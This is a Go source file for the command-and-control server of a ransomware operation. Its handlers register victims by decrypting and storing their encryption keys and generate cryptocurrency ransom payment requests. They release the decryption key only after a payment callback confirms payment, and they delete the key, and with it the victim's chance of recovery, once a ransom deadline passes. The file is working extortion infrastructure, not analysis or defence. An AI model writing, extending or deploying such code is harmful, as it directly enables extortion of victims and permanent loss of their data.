package server

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/Aran404/Forwarder/api/server"
	"github.com/Aran404/Ransomware/c2/database"
	"github.com/Aran404/Ransomware/c2/types"
	"github.com/go-chi/chi"
	"github.com/google/uuid"
	"go.mongodb.org/mongo-driver/bson"
)

func (c *Client) parseGetEncryption(w http.ResponseWriter, r *http.Request) *database.Ransomware {
	var (
		body *GetKeyBody
		v    []bson.M
		err  error
	)
	if err := ParseJSON(r, &body); err != nil {
		types.BadRequest(w, err)
		return nil
	}

	if body.UUID != "" {
		v, err = c.db.Filter(r.Context(), database.CollectionRansomware, bson.M{"uuid": body.UUID}, false)
		if err != nil {
			types.GInternalServerError(w)
			return nil
		}
	}

	if len(v) == 0 && len(body.Hashes) > 0 {
		v, err = c.db.MatchHashes(r.Context(), database.CollectionRansomware, body.Hashes)
		if err != nil {
			types.GInternalServerError(w)
			return nil
		}
	}

	if len(v) == 0 {
		types.BadRequest(w, types.ErrInvalidDump)
		return nil
	}

	vs, err := database.Convert[database.Ransomware](v)
	if err != nil {
		types.GInternalServerError(w)
		return nil
	}
	return vs[0]
}

func (c *Client) GetEncryptionKey(w http.ResponseWriter, r *http.Request) {
	payload := c.parseGetEncryption(w, r)
	if payload == nil {
		return
	}

	if !payload.Paid {
		if time.Now().Sub(time.UnixMilli(payload.Activated)) > RansomDeadline {
			types.BadRequest(w, types.ErrNoLongerValid)
			_ = c.db.Delete(r.Context(), database.CollectionRansomware, bson.M{"uuid": payload.UUID})
		} else {
			types.BadRequest(w, types.ErrNotPaid)
		}
		return
	}

	response := &GetKeyResponse{Success: true, EncryptionKey: payload.PrivateKey}
	SendJSON(w, response)
}

func (c *Client) PaidCallback(w http.ResponseWriter, r *http.Request) {
	// Must be localhost for this endpoint
	if !IsLocalhost(r) {
		types.GUnauthorized(w)
		return
	}

	id := chi.URLParam(r, "id")
	var body *server.WebhookResponse
	if err := ParseJSON(r, &body); err != nil {
		types.GInternalServerError(w)
		return
	}

	v, err := c.db.Filter(r.Context(), database.CollectionRansomware, bson.M{"uuid": id}, false)
	if err != nil {
		types.GInternalServerError(w)
		return
	}

	if len(v) == 0 {
		types.BadRequest(w, types.ErrInvalidDump)
		return
	}

	vs, err := database.Convert[database.Ransomware](v)
	if err != nil {
		types.GInternalServerError(w)
		return
	}

	payload := vs[0]
	payload.Paid = true
	payload.PaidAt = time.Now().UnixMilli()

	if err := c.db.Update(r.Context(), database.CollectionRansomware, bson.M{"uuid": id}, payload); err != nil {
		types.InternalServerError(w, types.ErrCantProccess)
		return
	}
}

func (c *Client) createPayment(uuid string) (*server.PaymentCreateResponse, error) {
	writer := NewResponseWriter()
	c.sol.HandleCreatePayment(writer, nil, &server.PaymentCreateBody{
		Amount:      RansomAmount,
		CallbackURI: fmt.Sprintf("http://localhost:9090/%s/%s", RansomPaidEndpoint, uuid),
	})

	var resp *server.PaymentCreateResponse
	if err := json.Unmarshal(writer.Data(), &resp); err != nil {
		return nil, err
	}

	return resp, nil
}

func (c *Client) processRansom(w http.ResponseWriter, pr *InitRansomResponse) {
	pm, err := c.createPayment(pr.UUID)
	if err != nil {
		types.GInternalServerError(w)
		return
	}

	if !pm.Success {
		types.GInternalServerError(w)
		return
	}

	pr.Address = pm.Address
	pr.Amount = pm.Amount
	pr.PaymentID = pm.ID
	pr.QRCode = pm.QRCode
	SendJSON(w, pr)
}

func (c *Client) InitalizeRansom(w http.ResponseWriter, r *http.Request) {
	var body *InitRansomBody
	if err := ParseJSON(r, &body); err != nil {
		types.BadRequest(w, err)
		return
	}

	rawKey, err := c.rsa.Decrypt(body.EncryptedKey)
	if err != nil {
		types.BadRequest(w, types.ErrInvalidRSA)
		return
	}

	nuuid := uuid.New().String()
	rs := &database.Ransomware{
		Paid:       false,
		PaidAt:     0,
		Hashes:     body.Hashes,
		UUID:       nuuid,
		Activated:  time.Now().UnixMilli(),
		PrivateKey: hex.EncodeToString(rawKey),
	}

	exists, err := c.db.HashesExist(r.Context(), database.CollectionRansomware, body.Hashes)
	if err != nil {
		types.GInternalServerError(w)
		return
	}

	if exists {
		types.BadRequest(w, types.ErrHashesExist)
		return
	}

	if err := c.db.Write(r.Context(), database.CollectionRansomware, rs); err != nil {
		types.GInternalServerError(w)
		return
	}

	partialResponse := &InitRansomResponse{
		Success:                true,
		UUID:                   nuuid,
		TimeBeforeDeactivation: time.Now().Add(RansomDeadline).UnixMilli(),
	}
	c.processRansom(w, partialResponse)
}
